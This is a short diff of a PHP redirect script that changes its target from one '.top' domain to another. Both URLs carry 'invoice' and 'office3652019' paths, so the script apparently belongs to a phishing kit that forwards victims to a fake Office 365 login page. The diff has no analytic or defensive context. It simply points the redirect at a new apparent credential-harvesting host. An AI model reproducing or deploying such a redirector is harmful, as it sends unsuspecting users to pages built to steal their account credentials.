@@ -11,7 +11,7 @@ function Redirect($url, $permanent = false)
  exit();
 }
 
-Redirect("https://abrilcaldeira.top/invoice/office3652019/cymk/index.php?
+Redirect("https://invoice.barloballonvaarten.top/office3652019?
 ", false);
 
 ?>
